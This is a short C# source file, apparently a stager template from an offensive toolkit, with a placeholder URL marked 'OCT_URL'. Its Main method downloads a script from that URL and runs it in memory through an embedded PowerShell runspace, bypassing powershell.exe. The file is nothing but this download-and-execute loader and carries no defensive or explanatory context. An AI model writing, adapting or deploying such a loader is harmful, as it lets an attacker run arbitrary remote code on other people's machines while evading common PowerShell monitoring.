using System.Management.Automation;
using System.Net;
using System;

namespace TT
{
    class NoT
    {
        static void Main()
        {
		WebClient client = new WebClient();
		String code = client.DownloadString("OCT_URL");
		PowerShell ps = PowerShell.Create();
		ps.AddScript(code);
		ps.Invoke();



        }
    }
}
